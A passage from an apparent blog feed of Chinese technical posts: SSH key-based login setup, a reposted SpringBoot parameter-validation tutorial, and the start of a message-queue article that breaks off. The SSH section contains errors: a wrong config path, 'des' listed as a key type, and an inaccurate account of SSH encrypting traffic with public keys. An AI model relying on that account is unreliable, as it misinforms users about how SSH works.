客户机通过<strong>ssh-keygen</strong>生成公钥、私钥对，服务器通过下载 openssh、启动 ssh 服务生成公钥私钥对；</p></li><li><p> 客户机要把生成的公钥（<code>~/.ssh/id_rsa.pub</code>，以 rsa 加密方式为例），投放到服务器上对应用户目录下的<code>~/.ssh/authorized_keys</code>；</p></li><li><p> 重启服务<code>systemctl restart ssh</code>即可。</p></li></ol><h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><ul><li><p>  <code>~/.ssh/authorized_keys</code>需要自己建立，<code>~/.ssh</code>权限 700，<code>~/.ssh/authorized_keys</code>权限 600，拥有者是本人</p></li><li><p>  只要对 **<code>/etc/ssh/sshd_config</code>、<code>~/.ssh/authorized_keys</code><strong>进行修改，需要</strong>重启 ssh 服务 ** 才能响应</p></li><li><p>  Xshell 上生成的公钥复制时，可能<strong>会少一个 s</strong>，注意核对</p></li><li><p>  Debian 和 Centos 的 sshd_config 默认有出入 ——<strong>Debian 默认 Root 禁登录</strong></p></li></ul><p>openssh<strong>配置文件</strong>(所有都以此文件为准)：<code>/etc/sshd_config</code></p><p>加密算法类型：rsa、ecdsa、des</p><ol><li><p> 通过<code>ssh-keygen</code>生成客户端的公钥、私钥密钥对；</p></li><li><p> 通过<code>ssh-copy-id -i ~/.ssh/id_rsa.pub root@server.example.com</code>把客户机的公钥发送到服务端用户所在的目录</p></li></ol><p>类似的还可以使用：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\[desktop] scp \~/.ssh/id\_rsa.pub root@server.example.com:\~     # 投放在服务端用户目录下</span><br><span class="line"></span><br><span class="line">\[server]  cat id\_rsa.pub &gt;&gt; /.ssh/authorized\_keys               # 把客户端公钥投放在服务端用户认证目录下</span><br></pre></td></tr></tbody></table></figure><p><strong>服务器公钥</strong>保存在客户端的位置：<code>~/.ssh/known_hosts</code>（客户机）</p><p><strong>客户机公钥</strong>存储在服务器上的位置：<code>~/.ssh/authorized_keys</code>（服务器）</p><h3 id="PS：服务端重新生成公钥、私钥方法"><a href="#PS：服务端重新生成公钥、私钥方法" class="headerlink" title="PS：服务端重新生成公钥、私钥方法"></a>PS：服务端重新生成公钥、私钥方法</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/ssh/ssh\_host\*          # 先删除原有的私钥、公钥</span><br><span class="line"></span><br><span class="line">/etc/init.d/sshd restart          # 再通过重新启动sshd服务重新生成</span><br></pre></td></tr></tbody></table></figure><ul><li><p>  服务端第一次启动 sshd 生成的公钥、私钥：<code>/etc/ssh/ssh_host_key*</code>（服务器）</p></li><li><p>  客户端用户生成的公钥（复制到服务端）：<code>~/.ssh/id_rsa.pub</code></p></li><li><p>  客户端用户生成的私钥（本地保存）：<code>~/.ssh/id_rsa</code></p></li></ul><h3 id="原理流程："><a href="#原理流程：" class="headerlink" title="原理流程："></a>原理流程：</h3><ol><li><p> 服务器建立公钥：每一次启动 sshd 服务时，该服务会主动去找<code>/etc/ssh/ssh_host*</code>的文件，若系统刚刚安装完成时，由于没有这些公钥，因此 sshd 会主动去计算出这些需要的公钥，同时也会计算出服务器自己需要的私钥</p></li><li><p> 客户端主动联机请求：若客户端想要联机到 ssh 服务器，则需要使用适当的客户端程序来联机，包括 ssh, putty 等客户端程序连接</p></li><li><p> 服务器传送公钥给客户端：接收到客户端的要求后，服务器便将第一个步骤取得的公钥传送给客户端使用 (此时应是明码传送，反正公钥本来就是给大家使用的)</p></li><li><p> 客户端记录并比对服务器的公钥数据及随机计算自己的公私钥：若客户端第一次连接到此服务器，则会将服务器的公钥记录到客户端的用户家目录内的<code>~/.ssh/known_hosts</code>。若是已经记录过该服务器的公钥，则客户端会去比对此次接收到的与之前的记录是否有差异。若接受此公钥，则开始计算客户端自己的公私钥</p></li><li><p> 回传客户端的公钥到服务器端：用户将自己的公钥传送给服务器。此时服务器：具有服务器的私钥与客户端的公钥，而客户端则是：具有服务器的公钥以及客户端自己的私钥，你会看到，在此次联机的服务器与客户端的密钥系统 (公钥 + 私钥) 并不一样，所以才称为非对称加密系统</p></li><li><p> 开始双向加解密：</p></li></ol><ul><li><p>  服务器到客户端：服务器传送数据时，拿用户的公钥加密后送出。客户端接收后，用自己的私钥解密</p></li><li><p>  客户端到服务器：客户端传送数据时，拿服务器的公钥加密后送出。服务器接收后，用服务器的私钥解密，这样就能保证通信安全</p></li></ul><p>参考资料：<a href="http://www.cnblogs.com/nexiyi/archive/2013/01/06/2847865.html">http://www.cnblogs.com/nexiyi/archive/2013/01/06/2847865.html</a>      ##RSA和DSA的原理</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot 参数校验组件</title>
      <link href="/posts/3028893647/"/>
      <url>/posts/3028893647/</url>
      
        <content type="html"><![CDATA[<h1 id="一坨一坨的-if-else-参数校验，终于被-SpringBoot-参数校验组件整干净了！"><a href="#一坨一坨的-if-else-参数校验，终于被-SpringBoot-参数校验组件整干净了！" class="headerlink" title="一坨一坨的 if/else 参数校验，终于被 SpringBoot 参数校验组件整干净了！"></a>一坨一坨的 if/else 参数校验，终于被 SpringBoot 参数校验组件整干净了！</h1><p>数据的校验的重要性就不用说了，即使在前端对数据进行校验的情况下，我们还是要对传入后端的数据再进行一遍校验，避免用户绕过浏览器直接通过一些 HTTP 工具直接向后端请求一些违法数据。</p><p>最普通的做法就像下面这样。我们通过 <code>if/else</code> 语句对请求的每一个参数一一校验。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416078.png" alt="Image"></p><p>这样的代码，小伙伴们在日常开发中一定不少见，很多开源项目都是这样对请求入参做校验的。</p><p>但是，不太建议这样来写，这样的代码明显违背了 <strong>单一职责原则</strong>。大量的非业务代码混杂在业务代码中，非常难以维护，还会导致业务层代码冗杂！</p><p>实际上，我们是可以通过一些简单的手段对上面的代码进行改进的！这也是本文主要要介绍的内容！</p><p>废话不多说！下面我会结合自己在项目中的实际使用经验，通过实例程序演示如何在 SpringBoot 程序中优雅地的进行参数验证(普通的 Java 程序同样适用)。</p><p>不了解的朋友一定要好好看一下，学完马上就可以实践到项目上去。</p><p>并且，本文示例项目使用的是目前最新的 Spring Boot 版本 2.4.5!（截止到 2021-04-21）</p><p>示例项目源代码地址：<a href="https://github.com/CodingDocs/springboot-guide/tree/master/source-code/bean-validation-demo">https://github.com/CodingDocs/springboot-guide/tree/master/source-code/bean-validation-demo</a> 。</p><h2 id="添加相关依赖"><a href="#添加相关依赖" class="headerlink" title="添加相关依赖"></a>添加相关依赖</h2><p>如果开发普通 Java 程序的的话，你需要可能需要像下面这样依赖：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416103.png" alt="Image"></p><p>不过，相信大家都是使用的 Spring Boot 框架来做开发。</p><p>基于 Spring Boot 的话，就比较简单了，只需要给项目添加上 <code>spring-boot-starter-web</code> 依赖就够了，它的子依赖包含了我们所需要的东西。另外，我们的示例项目中还使用到了 Lombok。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416150.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416141.png" alt="Image"></p><p>但是！！！Spring Boot 2.3 1 之后，<code>spring-boot-starter-validation</code>已经不包括在了 <code>spring-boot-starter-web</code> 中，需要我们手动加上！</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416148.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416122.png" alt="Image"></p><h2 id="验证-Controller-的输入"><a href="#验证-Controller-的输入" class="headerlink" title="验证 Controller 的输入"></a>验证 Controller 的输入</h2><h3 id="验证请求体"><a href="#验证请求体" class="headerlink" title="验证请求体"></a>验证请求体</h3><p>验证请求体即使验证被 <code>@RequestBody</code> 注解标记的方法参数。</p><p><strong><code>PersonController</code></strong></p><p>我们在需要验证的参数上加上了<code>@Valid</code>注解，如果验证失败，它将抛出<code>MethodArgumentNotValidException</code>。默认情况下，Spring 会将此异常转换为 HTTP Status 400（错误请求）。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416061.png" alt="Image"></p><p><strong><code>PersonRequest</code></strong></p><p>我们使用校验注解对请求的参数进行校验！</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416101.png" alt="Image"></p><p>正则表达式说明：</p><ul><li><code>^string</code> : 匹配以 string 开头的字符串</li><li><code>string$</code> ：匹配以 string 结尾的字符串</li><li><code>^string$</code> ：精确匹配 string 字符串</li><li><code>(^Man$|^Woman$|^UGM$)</code> : 值只能在 Man,Woman,UGM 这三个值中选择</li></ul><p><strong><code>GlobalExceptionHandler</code></strong></p><p>自定义异常处理器可以帮助我们捕获异常，并进行一些简单的处理。如果对于下面的处理异常的代码不太理解的话，可以查看这篇文章 <a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&amp;mid=2247485568&amp;idx=2&amp;sn=c5ba880fd0c5d82e39531fa42cb036ac&amp;chksm=cea2474bf9d5ce5dcbc6a5f6580198fdce4bc92ef577579183a729cb5d1430e4994720d59b34&amp;token=1924773784&amp;lang=zh_CN&amp;scene=21#wechat_redirect">《SpringBoot 处理异常的几种常见姿势》</a>。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416125.png" alt="Image"></p><p><strong>通过测试验证</strong></p><p>下面我通过 <code>MockMvc</code> 模拟请求 <code>Controller</code> 的方式来验证是否生效。当然了，你也可以通过 <code>Postman</code> 这种工具来验证。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416136.png" alt="Image"></p><p><strong>使用 <code>Postman</code> 验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230825000458295.png" alt="Image"></p><h3 id="验证请求参数"><a href="#验证请求参数" class="headerlink" title="验证请求参数"></a>验证请求参数</h3><p>验证请求参数（Path Variables 和 Request Parameters）即是验证被 <code>@PathVariable</code> 以及 <code>@RequestParam</code> 标记的方法参数。</p><p><strong><code>PersonController</code></strong></p><p><strong>一定一定不要忘记在类上加上 <code>Validated</code> 注解了，这个参数可以告诉 Spring 去校验方法参数。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416158.png" alt="Image"></p><p><strong><code>ExceptionHandler</code></strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416151.png" alt="Image"></p><p><strong>通过测试验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416180.png" alt="Image"></p><p><strong>使用 <code>Postman</code> 验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416164.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416169.png" alt="Image"></p><h2 id="验证-Service-中的方法"><a href="#验证-Service-中的方法" class="headerlink" title="验证 Service 中的方法"></a>验证 Service 中的方法</h2><p>我们还可以验证任何 Spring Bean 的输入，而不仅仅是 <code>Controller</code> 级别的输入。通过使用<code>@Validated</code>和<code>@Valid</code>注释的组合即可实现这一需求！</p><p>一般情况下，我们在项目中也更倾向于使用这种方案。</p><p><strong>一定一定不要忘记在类上加上 <code>Validated</code> 注解了，这个参数可以告诉 Spring 去校验方法参数。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416165.png" alt="Image"></p><p><strong>通过测试验证：</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416192.png" alt="Image"></p><p>输出结果如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name 不能为空</span><br><span class="line">sex 值不在可选范围</span><br></pre></td></tr></tbody></table></figure><h2 id="Validator-编程方式手动进行参数验证"><a href="#Validator-编程方式手动进行参数验证" class="headerlink" title="Validator 编程方式手动进行参数验证"></a>Validator 编程方式手动进行参数验证</h2><p>某些场景下可能会需要我们手动校验并获得校验结果。</p><p>我们通过 <code>Validator</code> 工厂类获得的 <code>Validator</code> 示例。另外，如果是在 Spring Bean 中的话，还可以通过 <code>@Autowired</code> 直接注入的方式。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">Validator validate</span><br></pre></td></tr></tbody></table></figure><p>具体使用情况如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230825000458311.png" alt="Image"></p><p>输出结果如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sex 值不在可选范围</span><br><span class="line">name 不能为空</span><br></pre></td></tr></tbody></table></figure><h2 id="自定以-Validator-实用"><a href="#自定以-Validator-实用" class="headerlink" title="自定以 Validator(实用)"></a>自定以 Validator(实用)</h2><p>如果自带的校验注解无法满足你的需求的话，你还可以自定义实现注解。</p><h3 id="案例一-校验特定字段的值是否在可选范围"><a href="#案例一-校验特定字段的值是否在可选范围" class="headerlink" title="案例一:校验特定字段的值是否在可选范围"></a>案例一:校验特定字段的值是否在可选范围</h3><p>比如我们现在多了这样一个需求：<code>PersonRequest</code> 类多了一个 <code>Region</code> 字段，<code>Region</code> 字段只能是<code>China</code>、<code>China-Taiwan</code>、<code>China-HongKong</code>这三个中的一个。</p><p><strong>第一步，你需要创建一个注解 <code>Region</code>。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416180-2891856.png" alt="Image"></p><p><strong>第二步，你需要实现 <code>ConstraintValidator</code>接口，并重写<code>isValid</code> 方法。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416185.png" alt="Image"></p><p>现在你就可以使用这个注解：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Region</span><br><span class="line">private String region;</span><br></pre></td></tr></tbody></table></figure><p><strong>通过测试验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416183.png" alt="Image"></p><p><strong>使用 <code>Postman</code> 验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416223.png" alt="Image"></p><h3 id="案例二-校验电话号码"><a href="#案例二-校验电话号码" class="headerlink" title="案例二:校验电话号码"></a>案例二:校验电话号码</h3><p>校验我们的电话号码是否合法，这个可以通过正则表达式来做，相关的正则表达式都可以在网上搜到，你甚至可以搜索到针对特定运营商电话号码段的正则表达式。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PhoneNumber.java</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416200.png" alt="Image"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PhoneNumberValidator.java</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416210.png" alt="Image"></p><p>搞定，我们现在就可以使用这个注解了。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230825000539686.png" alt="Image"></p><p><strong>通过测试验证</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416200-2891856.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416239.png" alt="Image"></p><h2 id="使用验证组"><a href="#使用验证组" class="headerlink" title="使用验证组"></a>使用验证组</h2><p>验证组我们基本是不会用到的，也不太建议在项目中使用，理解起来比较麻烦，写起来也比较麻烦。简单了解即可！</p><p>当我们对对象操作的不同方法有不同的验证规则的时候才会用到验证组。</p><p>我写一个简单的例子，你们就能看明白了！</p><p><strong>1.先创建两个接口，代表不同的验证组</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public interface AddPersonGroup {</span><br><span class="line">}</span><br><span class="line">public interface DeletePersonGroup {</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>2.使用验证组</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416237.png" alt="Image"></p><p>通过测试验证：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3028893647/640-20230824234416215.png" alt="Image"></p><p>验证组使用下来的体验就是有点反模式的感觉，让代码的可维护性变差了！尽量不要使用！</p><h2 id="常用校验注解总结"><a href="#常用校验注解总结" class="headerlink" title="常用校验注解总结"></a>常用校验注解总结</h2><p><code>JSR303</code> 定义了 <code>Bean Validation</code>（校验）的标准 <code>validation-api</code>，并没有提供实现。<code>Hibernate Validation</code>是对这个规范/规范的实现 <code>hibernate-validator</code>，并且增加了 <code>@Email</code>、<code>@Length</code>、<code>@Range</code> 等注解。<code>Spring Validation</code> 底层依赖的就是<code>Hibernate Validation</code>。</p><p><strong>JSR 提供的校验注解</strong>:</p><ul><li><code>@Null</code> 被注释的元素必须为 null</li><li><code>@NotNull</code> 被注释的元素必须不为 null</li><li><code>@AssertTrue</code> 被注释的元素必须为 true</li><li><code>@AssertFalse</code> 被注释的元素必须为 false</li><li><code>@Min(value)</code> 被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li><li><code>@Max(value)</code> 被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li><li><code>@DecimalMin(value)</code> 被注释的元素必须是一个数字，其值必须大于等于指定的最小值</li><li><code>@DecimalMax(value)</code> 被注释的元素必须是一个数字，其值必须小于等于指定的最大值</li><li><code>@Size(max=, min=)</code> 被注释的元素的大小必须在指定的范围内</li><li><code>@Digits (integer, fraction)</code> 被注释的元素必须是一个数字，其值必须在可接受的范围内</li><li><code>@Past</code> 被注释的元素必须是一个过去的日期</li><li><code>@Future</code> 被注释的元素必须是一个将来的日期</li><li><code>@Pattern(regex=,flag=)</code> 被注释的元素必须符合指定的正则表达式</li></ul><p><strong>Hibernate Validator 提供的校验注解</strong>：</p><ul><li><code>@NotBlank(message =)</code> 验证字符串非 null，且长度必须大于 0</li><li><code>@Email</code> 被注释的元素必须是电子邮箱地址</li><li><code>@Length(min=,max=)</code> 被注释的字符串的大小必须在指定的范围内</li><li><code>@NotEmpty</code> 被注释的字符串的必须非空</li><li><code>@Range(min=,max=,message=)</code> 被注释的元素必须在合适的范围内</li></ul><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>经常有小伙伴问到：“<code>@NotNull</code> 和 <code>@Column(nullable = false)</code> 两者有什么区别？”</p><p>我这里简单回答一下：</p><ul><li><code>@NotNull</code>是 JSR 303 Bean 验证批注,它与数据库约束本身无关。</li><li><code>@Column(nullable = false)</code> : 是 JPA 声明列为非空的方法。</li></ul><p>总结来说就是即前者用于验证，而后者则用于指示数据库创建表的时候对表的约束。</p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么要用消息队列？你项目中是怎么用的</title>
      <link href="/posts/2853285209/"/>
      <url>/posts/2853285209/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要用消息队列？你项目中是怎么用的？"><a href="#为什么要用消息队列？你项目中是怎么用的？" class="headerlink" title="为什么要用消息队列？你项目中是怎么用的？"></a>为什么要用消息队列？你项目中是怎么用的？</h1><p>包含原理+BAT案例实践，看完需要5分钟</p><blockquote><p>本文内容预览：</p><ol><li>是什么？为什么？<br>1.1 什么是消息队列<br>1.2 为什么要使用消息队列<br>1.3 引入消息队列的带来了哪些问题</li><li>怎么样？<br>2.1 支撑七年双11零故障的RocketMQ<br>2.2 快手万亿级kafka集群的平滑扩容<br>2.3 快手/美团对kafka缓存污染的优化<br>2.4 CMQ在微信红包支付场景下的应用</li></ol></blockquote><h1 id="Part1是什么？为什么？"><a href="#Part1是什么？为什么？" class="headerlink" title="Part1是什么？为什么？"></a>Part1是什么？为什么？</h1><h2 id="1什么是消息队列"><a href="#1什么是消息队列" class="headerlink" title="1什么是消息队列"></a>1什么是消息队列</h2><p>说到Java中的队列应该都不会陌生。其具有通过先进先出，或者双端进出的方式进行数据管理；通过阻塞以达到自动平衡负载的功能。</p><p>消息队列之所以以队列命名，起初也是因为其功能和操作，和java的本地队列有相似之处。所以，我们可以简单的认为消息队列就是为了满足分布式下各服务之间的数据传输、管理和消费的一种中间服务。</p><h2 id="2为什么要使用消息队列"><a href="#2为什么要使用消息队列" class="headerlink" title="2为什么要使用消息队列"></a>2为什么要使用消息队列</h2><p><strong>问：你们的系统中为什么要引入消息队列？</strong></p><p>我们总归需要知晓消息队列的使用价值，以及自己的业务场景下的实际痛点才能回答为什么要用消息队列这个问题，才能回答系统引入消息队列的价值所在。</p><h3 id="系统间解耦"><a href="#系统间解耦" class="headerlink" title="系统间解耦"></a>系统间解耦</h3><p>以前几天在后台和关注公号的一个大佬讨论的广告流水更新的操作为例：</p><p>广告检索系统，需要感知广告贴的信息变动来更新自己的索引，但实际上检索系统和投放、物料、资产等系统间没有必要依靠接口对感知行为进行强关联，且接口的方式在维护和系统的压力方面不友好，那么，消息队列的作用就显的很重要了，各系统发布各自的消息，谁需要谁订阅，达到目的同时不会增加额外的系统调用压力。（注：builder的接口调用是为了获取最新的信息，此处可以通过压缩等方式进行优化）</p><p>因此，<em>当系统间无实时数据交互要求，但还需要其业务信息时，可以用消息队列来达到系统间解耦的作用，只要发布方定义好消息队列格式，消费方的任何操作均可和发布方无关，减少了不必要的联调和发布冲突等影响。</em></p><h3 id="服务异步化"><a href="#服务异步化" class="headerlink" title="服务异步化"></a>服务异步化</h3><p>最典型的一个例子，就是支付场景下的结果通知功能。</p><p>我们知道，一般情况下不管是app push 还是短信通知，都是比较耗时的操作。所以，没有必要因为这些非核心功能的耗时操作而影响了支付的核心操作，只要我们在支付操作完成之后，将支付结果发到短信中心指定的消息topic下，短信中心自然会接收到此消息并保证通知给用户。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625459.png" alt="Image">图片来源于知乎回答</p><p>因此使用消息队列，让非核心的操作异步化，提高整个业务链路的高效和稳定，是很有效的。</p><h3 id="削峰填谷"><a href="#削峰填谷" class="headerlink" title="削峰填谷"></a>削峰填谷</h3><p>这个功能使我们本篇关注的重点，面对特殊场景如秒杀、春晚红包等万亿级流量的脉冲式压力下，一种保护我们系统的服务免于崩溃的有效手段就是消息队列。</p><p>通过消息中心高性能的存储和处理能力，将超过系统处理能力的多余流量暂时存储起来，并在系统处理能力内平缓释放出来，达到削峰的效果。</p><p>比如我们的广告计费系统，面对上万并发的商业贴检索量，数千并发的点击操作，实时接口的方式一定是不合适的，毕竟广告行为和支付行为不一样，支付失败用户还可以重试，但用户的商业贴点击行为是不可回放的，本次流量过去就过去了，因此，需要利用消息队列将扣费请求缓存下来，来保证计费系统的稳定。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还如广播、事务型、最终一致性等特性，也是消息队列经常用到的功能。</p><h2 id="3消息队列会存在哪些问题"><a href="#3消息队列会存在哪些问题" class="headerlink" title="3消息队列会存在哪些问题"></a>3消息队列会存在哪些问题</h2><h3 id="业务上增加响应延迟"><a href="#业务上增加响应延迟" class="headerlink" title="业务上增加响应延迟"></a>业务上增加响应延迟</h3><p>前面提到，消息队列使得业务非核心流程异步化，可以提高整个业务操作的时效性和流畅度，提升用户操作体验。<em>但</em>，也是因为数据进入队列的原因，不可避免的会耽搁消费速度。导致业务生效不及时。</p><p>比如，之前遇到的商品推荐，产品要求推荐列表中不能出现满减秒杀的商品，以消除特殊商品对推荐效果产生影响。除了秒杀，我们还需要感知商品的上下架、黑名单、库存等等，因次，用redis中的bit多个偏移量来维护一个商品的多个状态。然后接收促销组的消息来变更推荐缓存集群中的商品状态，但由于消息的延迟，就有可能导致商品状态变更不及时的情况发生。不过只要权衡之下业务和技术上是可接受的就OK了。</p><h3 id="架构上引入不稳定因素"><a href="#架构上引入不稳定因素" class="headerlink" title="架构上引入不稳定因素"></a>架构上引入不稳定因素</h3><p>消息队列的引入，相当于在原有的分布式服务链路中新增了一个系统，系统复杂度也随之变大了。同时，消息队列的作用要求其具有高性能和高可用。</p><p>所以，面对<strong>怎样部署高可用稳定集群</strong>、<strong>消息发送不成功怎么重试</strong>、<strong>broker数据同步策略怎么设置</strong>、<strong>broker异常导致消息重发怎么幂等</strong>、<strong>消费不成功怎么重试</strong>等等问题，需要中间件团队和业务系统一起努力应对。</p><h1 id="Part2怎么样？"><a href="#Part2怎么样？" class="headerlink" title="Part2怎么样？"></a>Part2怎么样？</h1><h2 id="4支撑七年双11零故障的RocketMQ"><a href="#4支撑七年双11零故障的RocketMQ" class="headerlink" title="4支撑七年双11零故障的RocketMQ"></a>4支撑七年双11零故障的RocketMQ</h2><p>2020 年双十一交易峰值达到 58.3W 笔/秒。RocketMQ为了阿里的交易生态有很多深度定制，这里我们只介绍其中针对高可用的优化。</p><p>个人理解，push消费模式只适合于消费速度远大于生产速度的场景，如果是大流量并发场景，基本还是以Pull消费为主。</p><p>而pull前broker和client间会进行负载均衡建立连接，那么，一旦Client被Hang住,(<em>没有宕就不会rebalance，即时宕机也是默认20s才会rebalance</em>)，就会让broker与该client关联的队列消息无法及时被消费，导致积压。怎么办：<strong>POP</strong>，新的消费模式</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625509.png" alt="Image"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2853285209/640-20230824234625443.png" alt="Image"></p><p><img src= 